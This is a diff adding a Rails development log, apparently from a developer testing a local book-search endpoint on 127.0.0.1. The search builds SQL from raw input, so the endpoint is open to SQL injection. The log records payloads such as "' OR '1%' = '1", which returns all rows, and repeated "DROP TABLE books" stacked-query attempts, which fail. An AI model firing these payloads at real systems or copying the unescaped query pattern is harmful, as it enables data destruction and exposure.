+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.2ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (61.5ms)
+Started GET "/books/search?keyword=%27+OR+%271%27+%3D+1" for 127.0.0.1 at 2017-09-30 17:56:35 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1' = 1"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1' = 1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1: SELECT * FROM books WHERE title LIKE '%' OR '1' = 1%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.7ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (61.5ms)
+Started GET "/books/search?keyword=%25%25%27%3BSELECT+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 17:56:50 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"%%';SELECT '1%' = '1"}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%%%';SELECT '1%' = '1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT '1%' = '1%'' at line 1: SELECT * FROM books WHERE title LIKE '%%%';SELECT '1%' = '1%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.2ms)
+Started GET "/books/search?keyword=%27+OR+%271%27+%3D+1" for 127.0.0.1 at 2017-09-30 17:56:56 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1' = 1"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1' = 1%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1: SELECT * FROM books WHERE title LIKE '%' OR '1' = 1%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.9ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (61.0ms)
+Started GET "/books/search?keyword=%27+OR+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 17:57:17 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1%' = '1"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1%' = '1%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.8ms)
+Completed 200 OK in 16ms (Views: 12.7ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=%27robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:01:40 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"'robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%'robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'robert';DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%'robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (69.9ms)
+Started GET "/books/search?keyword=%27+OR+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 18:01:52 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1%' = '1"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1%' = '1%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+Completed 200 OK in 14ms (Views: 12.8ms | ActiveRecord: 0.2ms)
+
+
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:01:53 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.7ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (67.1ms)
+Started GET "/books/search?keyword=%27+OR+%271%25%27+%3D+%271" for 127.0.0.1 at 2017-09-30 18:03:20 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"' OR '1%' = '1"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%' OR '1%' = '1%'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.7ms)
+Completed 200 OK in 14ms (Views: 12.9ms | ActiveRecord: 0.3ms)
+
+
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:04:08 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.9ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.7ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (63.3ms)
+Started POST "/__web_console/repl_sessions/84640695c9e9349550470afdc4969136/trace" for 127.0.0.1 at 2017-09-30 18:04:18 +0800
+Started POST "/__web_console/repl_sessions/84640695c9e9349550470afdc4969136/trace" for 127.0.0.1 at 2017-09-30 18:04:20 +0800
+Started PUT "/__web_console/repl_sessions/84640695c9e9349550470afdc4969136" for 127.0.0.1 at 2017-09-30 18:04:23 +0800
+Started PUT "/__web_console/repl_sessions/84640695c9e9349550470afdc4969136" for 127.0.0.1 at 2017-09-30 18:04:23 +0800
+Started PUT "/__web_console/repl_sessions/84640695c9e9349550470afdc4969136" for 127.0.0.1 at 2017-09-30 18:04:39 +0800
+Started PUT "/__web_console/repl_sessions/84640695c9e9349550470afdc4969136" for 127.0.0.1 at 2017-09-30 18:04:43 +0800
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:05:51 +0800
+  [1m[36mActiveRecord::SchemaMigration Load (0.4ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 9ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (4.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (72.5ms)
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:06:46 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.7ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (64.3ms)
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT DATABASE() as db[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT GET_LOCK('2346284283161265405', 0);[0m
+  [1m[36mActiveRecord::SchemaMigration Load (0.2ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.2ms)[0m  [1m[34mSELECT  `ar_internal_metadata`.* FROM `ar_internal_metadata` WHERE `ar_internal_metadata`.`key` = 'environment' LIMIT 1[0m
+  [1m[35m (0.1ms)[0m  [1m[35mBEGIN[0m
+  [1m[35m (0.1ms)[0m  [1m[35mCOMMIT[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT RELEASE_LOCK('2346284283161265405')[0m
+  [1m[36mActiveRecord::SchemaMigration Load (0.2ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+  [1m[35m (0.1ms)[0m  [1m[35mSHOW CREATE TABLE `books`[0m
+  [1m[35m (0.2ms)[0m  [1m[35mSHOW TABLE STATUS LIKE 'books'[0m
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:06:54 +0800
+  [1m[36mActiveRecord::SchemaMigration Load (0.3ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 9ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.2ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.6ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (69.1ms)
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:08:07 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (3.7ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.4ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (70.1ms)
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%23%23" for 127.0.0.1 at 2017-09-30 18:08:12 +0800
+  [1m[36mActiveRecord::SchemaMigration Load (0.4ms)[0m  [1m[34mSELECT `schema_migrations`.* FROM `schema_migrations`[0m
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;##"}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'[0m
+Completed 500 Internal Server Error in 10ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE books;##%'' at line 1: SELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;##%'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.1ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (70.7ms)
+Started GET "/books/search?keyword=robert%27%3BDROP+TABLE+books%3B%27%23%23" for 127.0.0.1 at 2017-09-30 18:08:30 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"robert';DROP TABLE books;'##"}
+  [1m[36mBook Load (0.2ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%robert';DROP TABLE books;'##%'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.2ms)
+
+
+  
